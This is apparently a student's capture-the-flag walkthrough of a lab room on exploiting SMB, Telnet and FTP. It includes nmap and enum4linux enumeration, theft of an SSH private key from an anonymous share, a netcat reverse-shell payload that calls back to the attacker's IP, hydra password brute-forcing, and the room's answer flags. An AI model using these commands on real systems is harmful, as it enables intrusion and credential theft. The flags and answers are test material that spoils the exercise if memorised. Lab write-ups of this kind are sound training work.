Task2: Understanding SMB
-------------------------

What is SMB?

> SMB - Server Message Block Protocol is a client-server communication protocol used for sharing access to files, printers, serial ports and other resources on a network.

> The SMB protocol is known as a response-request protocol, meaning that it transmits multiple messages between the client and server to establish a connection. Clients connect to servers using TCP/IP (actually NetBIOS over TCP/IP as specified in RFC1001 and RFC1002), NetBEUI or IPX/SPX.


* How does SMB work?

Once they have established a connection, clients can then send commands (SMBs) to the server that allow them to access shares, open files, read and write files, and generally do all the sort of things that you want to do with a file system. However, in the case of SMB, these things are done over the network.


* What runs SMB?

Microsoft Windows operating systems since Windows 95 have included client and server SMB protocol support. Samba, an open source server that supports the SMB protocol, was released for Unix systems.


1. What does SMB stand for?    

--> Server message block

2. What type of protocol is SMB?   

--> request-response

3. What do clients connect to servers using?

--> TCP/IP

4. What systems does Samba run on?

--> Unix


Task3: Enumerating SMB
-----------------------

#### SMB

Typically, there are SMB share drives on a server that can be connected to and used to view or transfer files. SMB can often be a great starting point for an attacker looking to discover sensitive information — you'd be surprised what is sometimes included on these shares.

##### Port Scanning

I suggest using nmap with the -A and -p- tags.

`-A` : Enables OS Detection, Version Detection, Script Scanning and Traceroute all in one

`-p-` : Enables scanning across all ports, not just the top 1000


##### Enum4Linux

* Enum4linux is a tool used to enumerate SMB shares on both Windows and Linux systems. 

* It is basically a wrapper around the tools in the Samba package and makes it easy to quickly extract information from the target pertaining to SMB.

syntax: `enum4linux [option] <ip>`

```
TAG            FUNCTION

-U             get userlist
-M             get machine list
-N             get namelist dump (different from -U and-M)
-S             get sharelist
-P             get password policy information
-G             get group and member list

-A             all of the above (full basic enumeration)
```

1. Conduct an nmap scan of your choosing, How many ports are open?

$ nmap $IP -p- -vv

Discovered open port 445/tcp on 10.10.70.208
Discovered open port 139/tcp on 10.10.70.208
Discovered open port 22/tcp on 10.10.70.208

--> 3


2. What ports is SMB running on?

--> 139/445

3. Let's get started with Enum4Linux, conduct a full basic enumeration. For starters, what is the workgroup name?

```
$ enum4linux -A 10.10.91.88

	xxx--- snip ---xxx

 =================================================== 
|    Enumerating Workgroup/Domain on 10.10.91.88    |
 =================================================== 
[+] Got domain/workgroup name: WORKGROUP

	xxx --- snip --- xxx

```

--> workgroup 

4. What comes up as the name of the machine?        

```
$ enum4linux -A <IP>

	xxx --- snip --- xxx

===================================== 
|    OS information on 10.10.91.88    |
 ===================================== 
Use of uninitialized value $os_info in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 464.
[+] Got OS info for 10.10.91.88 from smbclient: 
[+] Got OS info for 10.10.91.88 from srvinfo:
	POLOSMB        Wk Sv PrQ Unx NT SNT polosmb server (Samba, Ubuntu)
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03
	
	xxx --- snip --- xxx
```

--> polosmb


5. What operating system version is running?    

--> 6.1

6. What share sticks out as something we might want to investigate?    

```
$ enum4linux -A <IP>

	xxx --- snip --- xxx

 ======================================== 
|    Share Enumeration on 10.10.91.88    |
 ======================================== 
WARNING: The "syslog" option is deprecated

	Sharename       Type      Comment
	---------       ----      -------
	netlogon        Disk      Network Logon Service
	profiles        Disk      Users profiles
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (polosmb server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	xxx --- snip --- xxx
```

--> profiles



Task4: Exploiting SMB
----------------------

So, from our enumeration stage, we know:

    - The SMB share location

    - The name of an interesting SMB share


#### SMBClient

Because we're trying to access an SMB share, we need a client to access resources on servers. We will be using SMBClient because it's part of the default samba suite.

syntax: `smbclient //[IP]/[SHARE] -U <user> -p <port>`


1. What would be the correct syntax to access an SMB share called "secret" as user "suit" on a machine with the IP 10.10.10.2 on the default port?

--> smbclient //10.10.10.2/secret -U suit -p 139

2. Does the share allow anonymous access? Y/N?

```
$ smbclient //10.10.91.88/profiles -U Anonymous -p 139

or, 

$ smbclient //10.10.91.88/profiles -U Anonymous -p 445

		xxx ---- snip ---- xxx

smb: \> ls
  .                                   D        0  Tue Apr 21 12:08:23 2020
  ..                                  D        0  Tue Apr 21 11:49:56 2020
  .cache                             DH        0  Tue Apr 21 12:08:23 2020
  .profile                            H      807  Tue Apr 21 12:08:23 2020
  .sudo_as_admin_successful           H        0  Tue Apr 21 12:08:23 2020
  .bash_logout                        H      220  Tue Apr 21 12:08:23 2020
  .viminfo                            H      947  Tue Apr 21 12:08:23 2020
  Working From Home Information.txt      N      358  Tue Apr 21 12:08:23 2020
  .ssh                               DH        0  Tue Apr 21 12:08:23 2020
  .bashrc                             H     3771  Tue Apr 21 12:08:23 2020
  .gnupg                             DH        0  Tue Apr 21 12:08:23 2020

		12316808 blocks of size 1024. 7583720 blocks available

smb: \> get "Working From Home Information.txt"
getting file \Working From Home Information.txt of size 358 as Working From Home Information.txt (174.8 KiloBytes/sec) (average 174.8 KiloBytes/sec)

smb: \> exit
```
---> Y

3. Great! Have a look around for any interesting documents that could contain valuable information. Who can we assume this profile folder belongs to?

```
$ cat Working\ From\ Home\ Information.txt 

John Cactus,

As you're well aware, due to the current pandemic most of POLO inc. has insisted that, wherever 
possible, employees should work from home. As such- your account has now been enabled with ssh
access to the main server.

If there are any problems, please contact the IT department at it@polointernalcoms.uk

Regards,

James
Department Manager 
```

--> John Cactus

4. What service has been configured to allow him to work from home?

--> ssh

5. Okay! Now we know this, what directory on the share should we look in?

--> .ssh

6. This directory contains authentication keys that allow a user to authenticate themselves on, and then access, a server. Which of these keys is most useful to us?

--> `id_rsa` => ssh identity file

Download this file to your local machine, and change the permissions to "600" using "chmod 600 [file]".

Now, use the information you have already gathered to work out the username of the account. Then, use the service and key to log-in to the server


Used this code to find the user name and login:
```
#!/usr/bin/bash

for u in {john,cactus}
do
        ssh -i id_rsa $u@10.10.91.88
	echo "Nope!!"
done
```

7. What is the smb.txt flag?

--> `THM{smb_is_fun_eh?}`


Task5: Understanding Telnet
-----------------------------

#### What is Telnet?

Telnet is an application protocol which allows you, with the use of a telnet client, to connect to and execute commands on a remote machine that's hosting a telnet server.

The telnet client will establish a connection with the server. The client will then become a virtual terminal- allowing you to interact with the remote host.

* Replacement

Telnet sends all messages in clear text and has no specific security mechanisms. Thus, in many applications and services, Telnet has been replaced by SSH in most implementations.
 
* How does Telnet work?

The user connects to the server by using the Telnet protocol, which means entering "telnet" into a command prompt. The user then executes commands on the server by using specific Telnet commands in the Telnet prompt. You can connect to a telnet server with the following syntax: "telnet [ip] [port]"


1. What is Telnet?

--> application protocol

2. What has slowly replaced Telnet?

--> ssh

3. How would you connect to a Telnet server with the IP 10.10.10.3 on port 23?

--> telnet 10.10.10.3 23

4. The lack of what, means that all Telnet communication is in plaintext?

--> encryption


Task6: Enumerating Telnet:
---------------------------


#### Port Scanning

Scan the machine with nmap and the tag -A and -p-


1. How many ports are open on the target machine?

--> 1

2. What port is this ?

--> 8012

3. This port is unassigned, but still lists the protocol it's using, what protocol is this?

--> tcp

4. Now re-run the nmap scan, **`without`** the -p- tag, how many ports show up as open?

--> 0

#### NOTE:

> Here, we see that by assigning telnet to a non-standard port, it is not part of the common ports list, or top 1000 ports, that nmap scans. It's important to try every angle when enumerating, as the information you gather here will inform your exploitation stage.


5. Based on the title returned to us, what do we think this port could be used for?

```
$ nmap $IP -p8012 -sV -A -vv 

8012/tcp open  unknown syn-ack ttl 64
| fingerprint-strings: 
|   DNSStatusRequest, DNSVersionBindReq, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, X11Probe: 
|_    SKIDY'S BACKDOOR. Type .HELP to view commands
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8012-TCP:V=7.60%I=7%D=6/24%Time=60D4E5A2%P=x86_64-pc-linux-gnu%r(NU
SF:LL,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20command
SF:s\n")%r(GenericLines,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\
SF:x20view\x20commands\n")%r(GetRequest,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\
SF:x20\.HELP\x20to\x20view\x20commands\n")%r(HTTPOptions,2E,"SKIDY'S\x20BA
SF:CKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(RTSPRequest,
SF:2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n
SF:")%r(RPCCheck,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view
SF:\x20commands\n")%r(DNSVersionBindReq,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\
SF:x20\.HELP\x20to\x20view\x20commands\n")%r(DNSStatusRequest,2E,"SKIDY'S\
SF:x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(Help,2E
SF:,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")
SF:%r(SSLSessionReq,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20v
SF:iew\x20commands\n")%r(TLSSessionReq,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x
SF:20\.HELP\x20to\x20view\x20commands\n")%r(Kerberos,2E,"SKIDY'S\x20BACKDO
SF:OR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(SMBProgNeg,2E,"S
SF:KIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(
SF:X11Probe,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20c
SF:ommands\n")%r(FourOhFourRequest,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.
SF:HELP\x20to\x20view\x20commands\n")%r(LPDString,2E,"SKIDY'S\x20BACKDOOR\
SF:.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(LDAPSearchReq,2E,"S
SF:KIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(
SF:LDAPBindReq,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x
SF:20commands\n")%r(SIPOptions,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP
SF:\x20to\x20view\x20commands\n")%r(LANDesk-RC,2E,"SKIDY'S\x20BACKDOOR\.\x
SF:20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(TerminalServer,2E,"SKI
SF:DY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(NC
SF:P,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands
SF:\n")%r(NotesRPC,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20vi
SF:ew\x20commands\n")%r(JavaRMI,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HEL
SF:P\x20to\x20view\x20commands\n");
```

--> 1 backdoor


6. Who could it belong to? Gathering possible usernames is an important step in enumeration.

```
$ nmap $IP -p8012 -sV -A -vv

    xxx----snip----xxx

PORT     STATE SERVICE REASON         VERSION
8012/tcp open  unknown syn-ack ttl 64
| fingerprint-strings: 
|   DNSStatusRequest, DNSVersionBindReq, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, X11Probe: 
|_    SKIDY'S BACKDOOR. Type .HELP to view commands
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8012-TCP:V=7.60%I=7%D=6/24%Time=60D4E275%P=x86_64-pc-linux-gnu%r(NU
SF:LL,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20command
SF:s\n")%r(GenericLines,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\
SF:x20view\x20commands\n")%r(GetRequest,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\
SF:x20\.HELP\x20to\x20view\x20commands\n")%r(HTTPOptions,2E,"SKIDY'S\x20BA
SF:CKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(RTSPRequest,
SF:2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n
SF:")%r(RPCCheck,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view
SF:\x20commands\n")%r(DNSVersionBindReq,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\
SF:x20\.HELP\x20to\x20view\x20commands\n")%r(DNSStatusRequest,2E,"SKIDY'S\
SF:x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(Help,2E
SF:,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")
SF:%r(SSLSessionReq,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20v
SF:iew\x20commands\n")%r(TLSSessionReq,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x
SF:20\.HELP\x20to\x20view\x20commands\n")%r(Kerberos,2E,"SKIDY'S\x20BACKDO
SF:OR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(SMBProgNeg,2E,"S
SF:KIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(
SF:X11Probe,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20c
SF:ommands\n")%r(FourOhFourRequest,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.
SF:HELP\x20to\x20view\x20commands\n")%r(LPDString,2E,"SKIDY'S\x20BACKDOOR\
SF:.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(LDAPSearchReq,2E,"S
SF:KIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(
SF:LDAPBindReq,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x
SF:20commands\n")%r(SIPOptions,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP
SF:\x20to\x20view\x20commands\n")%r(LANDesk-RC,2E,"SKIDY'S\x20BACKDOOR\.\x
SF:20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(TerminalServer,2E,"SKI
SF:DY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(NC
SF:P,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands
SF:\n")%r(NotesRPC,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20vi
SF:ew\x20commands\n")%r(JavaRMI,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HEL
SF:P\x20to\x20view\x20commands\n")
```
--> skidy

#### NOTE:

> Always keep a note of information you find during your enumeration stage, so you can refer back to it when you move on to try exploits. 


> #### Basically, the thing is telnet is not running...


Task7: Exploiting telnet
-------------------------

So, from our enumeration stage, we know:

    - There is a poorly hidden telnet service running on this machine

    - The service itself is marked "backdoor"

    - We have possible username of "Skidy" implicated

Using this information, let's try accessing this telnet port, and using that as a foothold to get a full reverse shell on the machine!


# ![](not_getting_link?raw=true)


1. Great! It's an open telnet connection! What welcome message do we receive?

--> SKIDY'S BACKDOOR

2. Let's try executing some commands, do we get a return on any input we enter into the telnet session? (Y/N)

--> N

Hmm... that's strange. Let's check to see if what we're typing is being executed as a system command.


It was told in the room to start tcpdump at eth0...

But I started **`wireshark`** at eth0 

I found out that **`ping`** commnd is sending ICMP request ...

=> system command can be executed

We're going to generate a reverse shell payload using msfvenom.This will generate and encode a netcat reverse shell for us. Here's our syntax:

`"msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R"`

-p = payload
lhost = our local host IP address (this is your machine's IP address)
lport = the port to listen on (this is the port on your machine)
R = export the payload in raw format
 
=>

> mkfifo /tmp/wiyzvy; nc 10.10.120.207 4444 0</tmp/wiyzvy | /bin/sh >/tmp/wiyzvy 2>&1; rm /tmp/wiyzvy


3. What word does the generated payload start with?

--> mkfifo

4. What would the command look like for the listening port we selected in our payload?

--> nc -lvp 4444

# ![](getting_shell link?raw=true)

flag.txt --> `THM{y0u_g0t_th3_t3ln3t_fl4g}`


Task8: Understanding FTP
-------------------------

#### What is FTP?

File Transfer Protocol (FTP) is, as the name suggests , a protocol used to allow remote transfer of files over a network. It uses a client-server model to do this, and- as we'll come on to later- relays commands and data in a very efficient way.

#### How does FTP work?

A typical FTP session operates using two channels:

- a command (sometimes called the control) channel
- a data channel.

As their names imply, 

- the command channel is used for transmitting commands as well as replies to those commands.

- the data channel is used for transferring data.


FTP operates using a client-server protocol. The client initiates a connection with the server, the server validates whatever login credentials are provided and then opens the session.


#### Active vs Passive

The FTP server may support either Active or Passive connections, or both. 

- In an Active FTP connection, the client opens a port and listens. The server is required to actively connect to it. 

- In a Passive FTP connection, the server opens a port and listens (passively) and the client connects to it. 

> This separation of command information and data into separate channels is a way of being able to send commands to the server **`without having to wait for the current data transfer to finish`**. 
> If both channels were interlinked, you could only enter commands in between data transfers, which wouldn't be **`efficient`** for either large file transfers, or slow internet connections.

For more: [https://www.ietf.org/rfc/rfc959.txt](https://www.ietf.org/rfc/rfc959.txt)


1. What communications model does FTP use?

--> client-server

2. What's the standard FTP port?

--> 21

3. How many modes of FTP connection are there?    

--> 2


Task9: Enumerating FTP
-----------------------

#### NOTE:

It's worth noting  that some vulnerable versions of in.ftpd and some other FTP server variants return different responses to the "cwd" command for home directories which exist and those that don’t. This can be exploited because you can issue cwd commands before authentication, and if there's a home directory- there is more than likely a user account to go with it. While this bug is found mainly within legacy systems, it's worth knowing about, as a way to exploit FTP.

This vulnerability is documented at: [https://www.exploit-db.com/exploits/20745](https://www.exploit-db.com/exploits/20745)


1. How many ports are open on the target machine? 

--> 2

2. What port is ftp running on?

--> 21

3. What variant of FTP is running on it?  

--> vsFTPd

4. What is the name of the file in the anonymous FTP directory?

--> `PUBLIC_NOTICE.txt`

5. What do we think a possible username
could be?

--> Mike

Content of the file `PUBLIC_NOTICE.txt`

--> 
```
===================================
MESSAGE FROM SYSTEM ADMINISTRATORS
===================================

Hello,

I hope everyone is aware that the
FTP server will not be available 
over the weekend- we will be 
carrying out routine system 
maintenance. Backups will be
made to my account so I reccomend
encrypting any sensitive data.

Cheers,

Mike 
```

Task10: Exploiting FTP
----------------------

#### Types of FTP Exploit

Similarly to Telnet, when using FTP both the command and data channels are unencrypted. Any data sent over these channels can be intercepted and read.

So, from our enumeration stage, we know:

    - There is an FTP server running on this machine

    - We have a possible username

Using this information, let's try and `bruteforce the password` of the `FTP Server`.

##### Using hydra:

`hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp`


hydra --> Runs the hydra tool

-t 4 --> Number of parallel connections per target

-l [user] --> Points to the user who's account you're trying to compromise

-P [path to dictionary] -->  Points to the file containing the list of possible passwords

-vV   --> Sets verbose mode to very verbose, shows the login+pass combination for each attempt

ftp [protocol] --> Sets the protocol


1. What is the password for the user "mike"?

--> password

Logged in with mike:password creds => got ftp.txt and downloaded it to local machine

2. What is ftp.txt?

--> `THM{y0u_g0t_th3_ftp_fl4g}`



Task11: Expanding Your Knowledge:
---------------------------------

link1: [simple network services in ctfs](https://medium.com/@gregIT/exploiting-simple-network-services-in-ctfs-ec8735be5eef)

link2: [attack.mitre](https://attack.mitre.org/techniques/T1210/)

link3: [VPN vulns](https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/)


